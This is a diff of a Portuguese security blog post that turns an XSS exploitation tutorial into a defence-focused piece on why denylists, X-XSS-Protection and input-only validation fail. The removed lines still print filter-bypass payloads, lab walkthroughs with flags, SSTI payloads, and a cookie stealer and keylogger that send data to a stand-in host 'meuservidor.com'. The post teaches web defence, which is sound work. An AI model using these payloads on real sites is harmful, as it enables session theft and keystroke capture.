@@ -1,433 +1,40 @@
 ---
-title: XSS e HTML Injection - Tipos e Exploração
-description: 'Entendendo Cross-Site Scripting: Reflected, Stored e DOM-based XSS com exemplos práticos'
+title: "XSS: proteções, falhas e o que realmente funciona"
+description: "As 'proteções de XSS' que parecem seguras mas são bypassáveis — X-XSS-Protection, blacklist/WAF, htmlspecialchars mal-usado, 'só validar input' — por que falham, e o que de fato protege. Com atenção ao código gerado por IA (vibecoding)."
 author: matheus
-tags: ["XSS", "HTML Injection", "web security", "JavaScript", "pentesting", "CSP", "DOMPurify"]
+date: 2025-11-23
 categories: ["Segurança", "Web Security"]
+tags: ["XSS", "web security", "CSP", "DOMPurify", "secure coding", "AppSec", "vibe-coding"]
 pin: false
 comments: true
-
+permalink: /posts/xss-protecoes-e-falhas/
+redirect_from:
+  - /posts/xss-guia-completo/
 ---
 
-## Entendendo XSS: Reflected, Stored e DOM-based
+## O que é XSS (e por que este post foca nas DEFESAS)
 
-Se você já tentou fazer um input numa página web e viu seu texto aparecer na tela, provavelmente passou pela cabeça: "e se eu puder alterar o HTML ou botar um JavaScript aqui?". Bem, essa curiosidade é exatamente o que leva ao XSS - Cross-Site Scripting.
+XSS (Cross-Site Scripting) é fazer o navegador da vítima executar JavaScript que **você** controlou, no contexto do site alvo — roubo de sessão, ações em nome da vítima, keylogger. Em uma frase: o site confia num dado do usuário e o devolve como **código**, não como texto.
 
-## O que é XSS?
+Os três tipos, rápido:
 
-XSS é quando conseguimos injetar código JavaScript numa aplicação web e fazer ele rodar no navegador de outras pessoas. Parece simples, mas as consequências podem ser gigantes.
+| Tipo | Como chega | Analogia |
+|---|---|---|
+| **Reflected** | Volta na resposta da request atual — precisa a vítima clicar no link | Um **copo de água envenenado** entregue na mão da vítima |
+| **Stored** | Fica salvo no servidor e dispara pra todo mundo que abre a página | **Envenenar a água da cidade**: atinge todos, sem engenharia social |
+| **DOM-based** | O próprio JavaScript do front joga o dado num *sink* perigoso; o servidor nem vê | Um assaltante que entra **pela janela** enquanto todos vigiam a porta |
 
-Com XSS dá pra roubar cookies e sessões de login, capturar tudo que a vítima digita (keylogger), criar formulários falsos na própria página legítima pra phishing, redirecionar pro site malicioso que você quiser, ou até modificar completamente a aparência do site. O mais insidioso é que a vítima vê a URL original do site, então confia completamente no que está vendo.
+> 📖 Quer o guia completo de XSS — **o que é a fundo, como explorar do básico ao avançado** (contextos de injeção, recon, bypass de WAF, blind XSS) e a defesa moderna detalhada? Está no capítulo da série: **[XSS e HTML Injection](/posts/xss-html-injection/)**.
+{: .prompt-info }
 
-## Reflected XSS - O clássico
+**Este post é sobre o outro lado:** as "proteções de XSS" que aparecem em tutorial antigo, em config copiada da internet e — cada vez mais — em **código que a IA gera quando você pede "deixa seguro"**. Muitas *parecem* defesa e **não seguram** um atacante. Vamos ver cada uma: o que é, **por que falha**, o **bypass**, e o que realmente funciona.
 
-**Como funciona:** O servidor "reflete" de volta exatamente o que você enviou, sem filtrar nada. É tipo um espelho - você manda algo, ele mostra de volta na página.
-
-### Exemplo prático
-
-Imagina uma página de pesquisa simples:
-
-```html
-<!-- index.html -->
-<form method="GET">
-    <input type="text" name="q" placeholder="Pesquisar...">
-    <input type="submit" value="Buscar">
-</form>
-```
-
- - Formulário no HTML (frontend)
-
-```php
-<!-- PHP no topo do arquivo -->
-<?php
-if (isset($_GET['q']) && !empty($_GET['q'])) {
-    echo "Você pesquisou por: " . $_GET['q'];
-}
-?>
-```
-
- - PHP no topo do arquivo (backend)
-
-**Testando a vulnerabilidade:**
-
-Primeiro, vamos ver se aceita injeção de HTML:
-```url
-?q=<b>teste em negrito</b>
-```
-
-Se aparecer **teste em negrito**, temos confirmação de HTML injection. Agora o passo natural é testar tag `script`:
-
-```url
-?q=<script>alert("XSS funcionando!")</script>
-```
-
-**Bypass de filtros básicos:**
-
-Quando você testa XSS e o site bloqueia certas palavras, é hora de ser criativo. Vamos ver as formas de testar XSS:
-
-**1. Fechando tags existentes:**
-```html
-?q="><script>alert('bypass')</script>
-```
-Isso funciona porque muitas vezes seu input vai parar dentro de um atributo HTML tipo `<input value="SEU_INPUT">`. Quando você coloca `">`, você fecha o atributo e a tag, podendo inserir HTML novo. É como "escapar" do contexto atual.
-
-**2. Usando event handlers em tags válidas:**
-```html
-?q=<img src=x onerror="alert('imagem com erro')">
-```
-O `onerror` dispara quando a imagem não carrega (e `src=x` obviamente não vai carregar). Funciona mesmo se bloquearem `<script>`.
-
-**3. SVG com JavaScript:**
-```html
-?q=<svg onload="alert('svg carregado')">
-```
-O SVG é HTML válido e o `onload` executa assim que o elemento carrega. Muitos filtros esquecem do SVG.
-
-**4. Outras técnicas (até algumas mais avançadas):**
-```html
-<!-- Se bloquearem aspas, usar / -->
-?q=<script>alert(/XSS/)</script>
-
-<!-- Se bloquearem "alert", usar confirm -->
-?q=<script>confirm('XSS')</script>
-
-<!-- Usando JavaScript: protocol -->
-?q=<a href="javascript:alert('XSS')">clique</a>
-
-<!-- Body onload -->
-?q=<body onload="alert('XSS')">
-
-<!-- Obfuscação real que funciona -->
-?q=&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;
-<!-- Decodifica para: <script>alert('XSS')</script> -->
-
-<!-- URL encoding duplo -->
-?q=%253Cscript%253Ealert(1)%253C%252Fscript%253E
-
-<!-- JavaScript ofuscado com eval + base64 (técnica real) -->
-?q=<img src=x onerror="eval(atob('YWxlcnQoMSk='))">
-<!-- Base64 decodifica para: alert(1) -->
-
-<!-- String.fromCharCode para burlar filtros de palavras -->
-?q=<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
-<!-- Gera: alert(1) -->
-
-<!-- Quebrar palavras com comentários HTML -->
-?q=<scr<!---->ipt>alert(1)</scr<!---->ipt>
-
-<!-- Case mixing (misturar maiúscula/minúscula) -->
-?q=<ScRiPt>alert(1)</ScRiPt>
-
-<!-- Abusando de whitespace e quebras de linha -->
-?q=<script
->alert(1)</script
->
-
-<!-- Usando caracteres unicode -->
-?q=<script>alert\u0028\u0031\u0029</script>
-```
-
-**Por que essas técnicas funcionam:**
-
-- **HTML entities**: Browsers decodificam automaticamente `&lt;` para `<`
-- **URL encoding duplo**: Alguns servidores decodificam duas vezes
-- **Base64 + eval**: `eval()` executa string decodificada, burlando filtros de texto
-- **String.fromCharCode**: Constrói string dinamicamente, evitando palavras-chave
-- **Comentários HTML**: Quebram detecção de padrões `<script>`
-- **Case mixing**: Filtros case-sensitive não detectam
-- **Whitespace**: Quebra regex mal feitos
-- **Unicode**: Representa caracteres de forma alternativa
-
-**Na prática:** Essas técnicas de obfuscação são amplamente documentadas em plataformas como OWASP e relatórios de bug bounty - como os da HackerOne -, sendo encontradas frequentemente nessas pesquisas de segurança.
-
-### Explorando na prática
-
-Melhores formas para praticar seria criando a própria máquina vulnerável para entender como é feito, usar o site [testphp.vulnweb.com (Acunetix)](http://testphp.vulnweb.com/) e as máquinas de plataformas como tryhackme, hackthebox e até a própria hackingclub - que é o que usarei para neste documento. Outras plataformas excelentes serão recomendadas no final do documento, algumas valem MUITO a pena, viu?
-
-Máquina criada localmente para simular XSS:
-
-```html
-<!-- index.html -->
-<form method="GET">
-    <input type="text" name="q" placeholder="Pesquisar...">
-    <input type="submit" value="Buscar">
-</form>
-```
-```php
-<!-- PHP no topo do arquivo -->
-<?php
-if (isset($_GET['q']) && !empty($_GET['q'])) {
-    echo "Você pesquisou por: " . $_GET['q'];
-}
-?>
-```
-```
-http://localhost:8888/index.php?q=<script>alert('XSS!!')</script>
-```
-
-O navegador vê `<script>` como código legítimo → executa → alert aparece.
-
-Podemos tentar evitar isso no php ao utilizarmos htmlspecialchars
-
-```php
-<?php
-if (isset($_GET['q']) && !empty($_GET['q'])) {
-    echo "Você pesquisou por: " . htmlspecialchars($_GET['q'], ENT_QUOTES, 'UTF-8');
-}
-?>
-```
-
-**Agora resolvendo as máquinas do hackingclub**
-
-No container de teste XSS Reflected (10.10.0.3) encontrei um formulário de contato que refletia dados na URL:
-
-```
-http://10.10.0.3/?name=matheus&email=matheus%40laidler.com&message=teste
-```
- - formulário normal
-
-```
-http://10.10.0.3/?name=<b>matheus</b>&email=matheus%40laidler.com&message=teste
-```
- - testando injeção html
-
-```
-http://10.10.0.3/?name=<script>alert('teste xss')</script>&email=matheus%40laidler.com&message=teste
-```
- - testando xss -> gerou flag no formulário
-
-**Resultado:** Flag capturada! `CS{XSS_R3fl3ct3d_34sy}`
-
-**Roubo de sessão via cookie:**
-
-```html
-<!--
-// Criar cookie de teste no F12
-// document.cookie = "sessao=dados_secretos"
-
-// Payload para roubar -->
-<script>alert(document.cookie)</script>
-
-<script>
-// Enviando para servidor malicioso
-fetch('http://meuservidor.com/roubar.php?cookie=' + document.cookie)
-</script>
-```
-
-**A pegadinha do Reflected XSS:** Você precisa fazer a vítima clicar no seu link malicioso. Por isso funciona bem em phishing - "Clica aqui pra ver sua fatura" e o link tem a payload XSS. A vítima clica, a página executa seu JavaScript, e você rouba a sessão dela.
-
-## Stored XSS - O persistente
-
-**Como funciona:** Sua payload fica salva no servidor (banco de dados, arquivo, etc) e executa toda vez que alguém acessa a página.
-
-### Por que é mais perigoso?
-
-**Stored XSS** é como envenenar o fornecimento de água da cidade, ao invés de entregar um copo de água envenenado diretamente para o alvo (**Reflected**).
-
-- **Sem engenharia social** - Você não precisa convencer ninguém a clicar em nada suspeito
-- **Atinge todos** - Todo mundo que visita a página é afetado automaticamente
-- **Persistente** - Sua payload fica lá funcionando 24/7 até alguém descobrir e remover
-- **Escala real** - Se for um site popular, você pode afetar milhares de pessoas
-
-Enquanto em um deles você precisa fazer engenharia social para convencer a pessoa a beber a água do copo, no outro você envenenou a fonte para que qualquer pessoa que beber, incluindo seu alvo, irá ser afetada.
-
-### Exemplo prático
-
-Testando o comment box que salva mensagens no servidor:
-
-```html
-<!-- Primeiro teste: HTML injection -->
-<b>Comentário em negrito</b>
-```
-
-Não funcionou imediatamente, apenas ao recarregar a página e fazer puxar do backend: apareceu em negrito. Confirmamos que temos HTML injection. Vamos tentar aplicar javascript:
-
-```html
-<!-- Escalando para JavaScript -->
-<script>alert('Stored XSS funcionando!')</script>
-```
-
-Agora qualquer pessoa que acessar essa página vai ter o script executando automaticamente.
-
-**Resultado:** Flag capturada! `CS{XSS_St0r3d_l1k3_4_b0ss}`
-
-**Diferença técnica:** O backend armazena nossa payload e serve ela pra todos os visitantes, não apenas reflete de volta.
-
-## DOM-based XSS - O invisível
-
-**Como funciona:** A vulnerabilidade está no JavaScript do frontend, não no backend, ou seja, o servidor NUNCA verá a payload.
-
-### Por que DOM-based é diferente?
-
-DOM-based XSS é como um assaltante que entra pela janela enquanto todo mundo está vigiando a porta da frente:
-
-- **Backend cego** - O servidor nem sabe que tem JavaScript malicioso rodando
-- **Manipulação direta** - O próprio JavaScript da página processa seus dados e se sabota
-- **Invisível nos logs** - Não deixa rastro no servidor, só no navegador da vítima
-- **Mais difícil de encontrar** - Ferramentas de scanner não detectam facilmente
-
-Basicamente, você usa o próprio código JavaScript da página contra ela mesma.
-
-### Encontrando DOM XSS no container
-
-Nesse container DOME do hackingclub temos com um campo de pesquisa que funcionava, printava na tela o que pesquisamos e refletia a pesquisa na url:
-
-```text
-parametro url> 10.10.0.3/?search=teste
-
-0 resultados para 'teste'
-```
-
-Inspecionando o código, vi que o "teste" nem aparecia no HTML fonte, como se teste fosse o valor de uma variável. 
-
-Então logo o código vulnerável foi encontrado:
-
-```html
-<h1><span>0 results for '</span><span id="searchMessage"></span><span>'</span></h1>
-
-<script>
-    function pesquisar(pesquisa) {
-        document.getElementById('searchMessage').innerHTML = pesquisa;
-    }
-
-    var pesquisa = (new URLSearchParams(window.location.search)).get('search');
-    if (pesquisa) {
-        pesquisar(pesquisa);
-    }
-</script>
-
-```
-
-Um resumo rápido do que encontramos é o fato do front-end estar alterando o conteúdo da variável, o que queremos pesquisar está dentro de `searchMessage` e o maior problema está no `innerHTML` sem sanitização, permitindo injeção de payload XSS.
-
-**Testando injeção no parâmetro da url:**
-```html
-?search=<b style="color: red">texto vermelho</b>
-```
-
-Funcionou! Agora JavaScript:
-```html
-?search=<script>alert('DOM XSS funcionando!')</script>
-```
-
-**Resultado:** Flag capturada! `CS{XSS_D0M_B4s3d}`
-
-**Diferença técnica:** O frontend manipula o DOM diretamente baseado nos parâmetros da URL, sem enviar nada pro servidor.
-
-## Payloads que realmente funcionam
-
-Depois de testar XSS em diferentes laboratórios e sites, aqui estão alguns payloads que podem ter utilidade para seus estudos. Cada um tem sua especialidade, deixarei alguns abaixo com base no que apresentamos nesta documentação:
-
-### Básicos para teste
-
-```html
-<script>alert('XSS')</script>
-<img src=x onerror="alert('XSS')">
-<svg onload="alert('XSS')">
-<body onload="alert('XSS')">
-```
-
-### Bypass de filtros
-
-```html
-<!-- Se bloquear "script" --> 
-<img src=x onerror="alert('bypass')">
-
-<!-- Se bloquear "alert" --> 
-<script>confirm('bypass')</script>
-
-<!-- Se bloquear aspas -->
-<script>alert(/XSS/)</script>
-
-<!-- Encoding --> 
-<script>alert(String.fromCharCode(88,83,83))</script>
-
-<!-- Event handlers -->
-<input onfocus="alert('XSS')" autofocus>
-```
-
-### Cookie stealer
-
-```javascript
-var cookie = document.cookie;
-var img = new Image();
-img.src = "http://meuservidor.com/roubar.php?cookie=" + cookie;
-```
-
-### Keylogger básico
-
-```javascript
-document.addEventListener('keypress', function(e) {
-    var img = new Image();
-    img.src = "http://meuservidor.com/keys.php?key=" + e.key;
-});
-```
-
-### Redirecionamento
-
-```javascript
-window.location = "http://sitemalicioso.com";
-```
-
-### Explorando diferentes tecnologias
-
-**Server-Side Template Injection (SSTI) que vira XSS:**
-
-Algumas aplicações usam template engines que podem ser explorados:
-
-{% raw %}
-
-```javascript
-// Jinja2 (Python/Flask)
-{{7*'7'}} // Testa se executa (retorna 7777777)
-{{config.items()}} // Vaza configurações
-{{''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].exit()}}
-
-// Handlebars (Node.js)
-{{#with "s" as |string|}}
-  {{#with "e"}}
-    {{#with split as |conslist|}}
-      {{this.pop}}
-      {{#with string.concat("alert('XSS')") as |payload|}}
-        {{#each conslist}}
-          {{#with string.concat(this,payload) as |expr|}}
-            {{constructor.constructor(expr)()}}
-          {{/with}}
-        {{/each}}
-      {{/with}}
-    {{/with}}
-  {{/with}}
-{{/with}}
-
-// Angular (1.x)
-{{constructor.constructor('alert("XSS")')()}}
-```
-
-{% endraw %}
-
-**GraphQL injection:**
-```javascript
-// Em queries GraphQL
-{
-  user(id: "<img src=x onerror=alert(1)>") {
-    name
-  }
-}
-```
-
-**JSON injection em APIs:**
-```json
-{
-  "nome": "</script><script>alert('XSS')</script>",
-  "email": "test@test.com"
-}
-```
-
-Esses vetores são específicos de cada tecnologia e requerem conhecimento da stack da aplicação.
+> A regra que explica quase toda falha abaixo: XSS se resolve **tratando dado como dado** — *encoding na saída, conforme o contexto* — não tentando adivinhar e bloquear "o que é malicioso" na entrada. Defesa por **lista do que é proibido** (denylist) perde pra criatividade do atacante; **allowlist + encoding na saída** ganha.
+{: .prompt-tip }
 
 ## Como não virar vítima (Proteção completa)
 
-Agora que você sabe como explorar XSS, vamos ver como se defender de verdade. É tipo conhecer as táticas do ladrão para trancar a casa direito.
+Agora o que interessa neste post: como se defender **de verdade** — e por que tantas proteções que *parecem* certas **não defendem**. É tipo conhecer as táticas do ladrão pra trancar a casa direito (e descobrir quais "fechaduras" são de papelão).
 
 ### Regra número 1: Nunca confie no input do usuário
 
@@ -660,7 +267,8 @@ RewriteRule ^(.*)$ - [F,L]
 # Headers de segurança
 Header always set X-Content-Type-Options nosniff
 Header always set X-Frame-Options DENY
-Header always set X-XSS-Protection "1; mode=block"
+# X-XSS-Protection: DEPRECADO — não protege mais e pode até abrir brecha. Use 0 (desliga o legado) ou omita + CSP:
+Header always set X-XSS-Protection "0"
 
 # Content Security Policy básico
 Header always set Content-Security-Policy "default-src 'self'; script-src 'self'"
@@ -675,7 +283,7 @@ Um ponto importante: se a proteção está só no frontend, dá para contorná-l
 
 A **primeira camada** é o backend - sanitização e validação no servidor. Essa não pode ser burlada pelo usuário e protege contra Reflected e Stored XSS. Funciona mesmo se o JavaScript do navegador estiver desabilitado.
 
-A **segunda camada** são os headers HTTP como CSP, X-XSS-Protection e X-Frame-Options. São configurados no servidor mas executados pelo browser, e protegem principalmente contra DOM-based XSS e ataques client-side.
+A **segunda camada** são os headers HTTP como **CSP** e X-Frame-Options (o `X-XSS-Protection` **não** entra aqui — é deprecado, como vimos). São configurados no servidor mas executados pelo browser, e o CSP protege principalmente contra execução de scripts não autorizados.
 
 A **terceira camada** é o frontend - sanitização JavaScript, uso correto de APIs como textContent ao invés de innerHTML. Essa pode ser burlada se o atacante controlar o cliente, mas protege usuários normais contra DOM-based XSS. Funciona como última linha de defesa.
 
@@ -818,6 +426,9 @@ function redirecionarSeguro(url) {
 
 ### Validação de entrada: Cada campo tem sua regra
 
+> ⚠️ **Validar input NÃO é a defesa primária de XSS** — e blacklist de campo é bypassável. O mesmo dado é seguro num contexto e perigoso em outro, e dado legítimo carrega caractere especial (o nome `O'Brien` tem aspa). Valide por **allowlist do formato esperado** (um e-mail é um e-mail) como **reforço** — a defesa de verdade é o **encoding na saída** (logo abaixo). ([OWASP](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html))
+{: .prompt-warning }
+
 ```php
 <?php
 function validar_por_campo($valor, $tipo) {
@@ -855,6 +466,9 @@ if ($nome === false) {
 ```
 
 ### Detectando obfuscação em tempo real
+
+> ⚠️ **Isto é detecção/log (denylist), NÃO prevenção.** Bloquear `eval`/`atob`/`fromCharCode` e "palavras suspeitas" é *whack-a-mole*: sobra `setTimeout`, `Function`, template literals — ou um `onerror` simples que não usa nenhuma dessas. Serve pra **monitorar/alertar**, nunca como o conserto. A prevenção continua sendo **encoding na saída + CSP**.
+{: .prompt-warning }
 
 **Como identificar tentativas de obfuscação:**
 
@@ -908,8 +522,8 @@ X-Content-Type-Options: nosniff
 # Impede carregamento em frames (clickjacking)
 X-Frame-Options: DENY
 
-# Ativa proteção XSS do browser (backup)
-X-XSS-Protection: 1; mode=block
+# X-XSS-Protection: DEPRECADO — não ativa mais nada e pode introduzir brecha. Use 0 (ou omita) + CSP:
+X-XSS-Protection: 0
 
 # Força HTTPS (se disponível)
 Strict-Transport-Security: max-age=31536000; includeSubDomains
@@ -974,13 +588,24 @@ document.getElementById('conteudo').innerHTML = dadosLimpos;
 
 ### Resumindo a proteção
 
-Pra fechar a parte de defesa: sempre valide e sanitize inputs, faça escape apropriado pro contexto onde o dado vai aparecer (HTML, JavaScript, URL, cada um tem seu método), configure CSP restritivo, use os headers de segurança (X-XSS-Protection, X-Content-Type-Options), HTTPS sempre que possível, mantenha frameworks e bibliotecas atualizados, e rode scanner de vulnerabilidades regularmente.
+Pra fechar a parte de defesa: sempre valide e sanitize inputs, faça escape apropriado pro contexto onde o dado vai aparecer (HTML, JavaScript, URL, cada um tem seu método), configure CSP restritivo, use os headers de segurança (`X-Content-Type-Options`, `X-Frame-Options` — **não** o `X-XSS-Protection`, que é deprecado), HTTPS sempre que possível, mantenha frameworks e bibliotecas atualizados, e rode scanner de vulnerabilidades regularmente.
 
 ### O que NÃO funciona
 
 Alguns mitos que vejo por aí: "só bloquear a tag script resolve" - não resolve, existem dezenas de outras formas de executar JavaScript. "Filtro no frontend é suficiente" - nunca é, cliente não é confiável. "WAF resolve tudo" - WAF é complemento, não solução única. "Encoding resolve" - só em contextos específicos. "Blacklist é melhor que whitelist" - whitelist sempre ganha porque você define o que PODE, não o que NÃO PODE (e atacantes são criativos demais pra você prever tudo).
 
 Segurança se faz em camadas. Uma proteção falha? As outras seguram. É como trancar a porta, janela E colocar alarme - paranóico, mas efetivo.
+
+## 🤖 Vibecoding: cuidado com a "proteção" que a IA te dá
+
+Quando você pede pra uma IA "adicionar proteção contra XSS" sem ser específico, é comum ela devolver **exatamente as defesas deste post que falham**: um regex que remove `<script>`, um `X-XSS-Protection: 1; mode=block`, uma função de "sanitização" por blacklist, ou validação que quebra dado legítimo. Parece seguro, passa no teste óbvio (`<script>alert(1)</script>`) e abre a porta pro primeiro `<img onerror>`.
+
+Como se proteger ao *vibecodar*:
+
+- **Peça a defesa certa pelo nome:** "use **output encoding por contexto** e **DOMPurify (allowlist)**, não blacklist; configure **CSP com nonce**".
+- **Desconfie de qualquer regex que 'remove tags perigosas'** — é denylist.
+- **Teste o resultado com mais que `<script>`:** jogue `<img src=x onerror=alert(document.domain)>` e um payload em atributo de aspas simples.
+- É um caso particular de um problema maior — veja [Os riscos de segurança do vibecoding](/posts/vibecode-riscos-seguranca/).
 
 ## Ferramentas para testar XSS
 
@@ -994,31 +619,20 @@ Esses são os playgrounds onde você pode testar à vontade.
 
 O **DVWA** (Damn Vulnerable Web Application) é clássico e muito bom pra começar. O **WebGoat** são os labs oficiais da OWASP, bem didáticos. O **XSS Game** é um desafio interativo do Google que vale a pena. O **bWAPP** é outra aplicação vulnerável com vários níveis de dificuldade. A **PortSwigger Academy** tem labs gratuitos da galera do Burp Suite - muito bem feitos. O **TryHackMe** tem máquinas com XSS e explicações passo a passo, bom pra quem está começando. O **Hacking Club** é meu favorito, tem aulas e máquinas específicas de XSS. E o site `testphp.vulnweb.com` da Acunetix é um site vulnerável de propósito que você pode usar pra estudo.
 
-## O que você precisa lembrar
+## O que levar deste post
 
-**Reflected XSS:** O site "cospe" de volta o que você mandou → Precisa convencer a vítima a clicar  
-**Stored XSS:** Sua bomba fica plantada no servidor → Explode em todo mundo que visita  
-**DOM-based XSS:** O próprio JavaScript da página se sabota → Servidor nem percebe  
+A defesa de XSS que **funciona** cabe numa frase: **trate dado como dado** — codifique na **saída**, conforme o **contexto** (HTML, atributo, JS, URL) — e use **allowlist** (DOMPurify) pra HTML rico. CSP é a rede de segurança; cookies `HttpOnly`/`SameSite` limitam o estrago (mas não previnem o XSS).
 
-**A regra de ouro:** Se você conseguir injetar HTML (tipo `<b>negrito</b>`), provavelmente consegue injetar JavaScript também. É só questão de criatividade para burlar os filtros.
+O que **NÃO** conta como defesa, por mais que pareça: blacklist/regex de "palavras perigosas", `X-XSS-Protection`, "só validar input", detecção de obfuscação caseira, ou confiar só no WAF/CSP. Cada um falha sozinho — e vários aparecem prontos em código gerado por IA.
 
-**Dica de ouro:** Sempre teste primeiro com HTML simples. Se funcionar, escale para JavaScript. Se não funcionar, não perca tempo com payloads complexos.
+> 🧪 **Teste a sua "proteção" com mais que `<script>`:** jogue `<img src=x onerror=alert(document.domain)>` e um payload em **atributo de aspas simples**. Se passou, sua defesa é de papelão.
 
-**Flags capturadas nos testes:**
-
-- Reflected: `CS{XSS_R3fl3ct3d_34sy}`
-- Stored: `CS{XSS_St0r3d_l1k3_4_b0ss}`
-- DOM-based: `CS{XSS_D0M_B4s3d}`
-
-Lembre-se: XSS é sobre fazer o navegador da vítima executar código que você controlou. Uma vez que você entende isso, as possibilidades são infinitas.
-
-**Mas com grandes poderes vem grandes responsabilidades.** Use esse conhecimento pra proteger seus próprios projetos, fazer pentests autorizados, educar outros desenvolvedores e reportar vulnerabilidades de forma responsável. Nunca pra atacar sites sem permissão - além de crime, é desnecessário quando tem tanto lab legal pra praticar.
-
-Agora é só partir para a prática!
-
+> **Com grandes poderes vem grandes responsabilidades.** Use pra proteger seus projetos, fazer pentests autorizados, educar e reportar com responsabilidade — nunca pra atacar sem permissão. Pratique em lab (PortSwigger Academy, DVWA, TryHackMe, HackingClub).
+{: .prompt-warning }
 
 ## Leia também
 
+- **[XSS e HTML Injection — o guia completo](/posts/xss-html-injection/)** (a série: o que é, como explorar do básico ao avançado, e a defesa moderna detalhada)
+- [Os riscos de segurança do vibecoding](/posts/vibecode-riscos-seguranca/)
 - [SQL Injection da teoria à prática](/posts/sql-injection-definitivo/)
 - [Desenvolvimento Web na Prática com PHP](/posts/desenvolvimento-web-guia-pratico/)
-- [Secure Code Review com exercícios práticos](/posts/code-review-seguranca/)
